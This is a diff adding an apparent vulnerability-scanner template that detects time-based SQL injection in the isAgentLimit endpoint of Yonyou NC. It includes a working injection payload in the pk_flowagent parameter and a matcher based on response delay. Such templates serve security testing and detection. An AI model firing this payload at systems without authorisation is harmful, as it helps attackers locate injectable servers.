@@ -1,0 +1,28 @@
+id: yonyou-UFIDA-NC-oacoSchedulerEvents-sqli
+
+info:
+  name: 用友NC /oacoSchedulerEvents/isAgentLimit SQL注入
+  author: HuanXiong
+  severity: high
+  description: |
+    用友NC系统中/oacoSchedulerEvents/isAgentLimit接口存在SQL注入漏洞，攻击者可以通过构造恶意请求执行SQL命令，可能导致数据泄露或系统控制。
+  reference: |
+    -
+  tags: SQL注入,sql-injection,用友
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl: 
+          - "status_code==200 && duration_1>=3 && duration_1<=5"
